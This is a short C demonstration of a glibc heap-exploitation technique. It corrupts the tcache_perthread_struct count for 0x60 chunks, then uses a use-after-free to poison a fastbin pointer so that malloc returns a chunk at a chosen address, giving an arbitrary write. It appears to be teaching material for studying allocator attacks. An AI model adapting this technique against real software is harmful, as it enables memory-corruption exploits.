// libc >= 2.27

#include <stdlib.h>
#include <unistd.h>

void fill_7(char *base, int size)
{
	int offset = (size - 0x20) / 0x10;
	*(base+offset) = '\x07';
}

int main()
{	
	char *chunkA = (char *)malloc(0x10);
	char *tcache_perthread_struct = (char *)((int64_t)chunkA - 0x250);
	fill_7(tcache_perthread_struct, 0x60);

	/*
	 * tcache_count[0x60] = 7, tcache_entry[0x60] = NULL
	 * 1. since tcache_entry = NULL     => malloc won't take chunk from tcache.
	 * 2. since tcache_count[0x60] = 7  => fake chunk won't be put to tcache.
	 * 3. chunk_size only check the first four bits.
     */
	int *ptr = (int *)malloc(0x58);
	free(ptr);
	*ptr = 0x600ffa;
	malloc(0x58);
	ptr = (int *)malloc(0x58);
	*ptr = 0xfaceb00c;
}
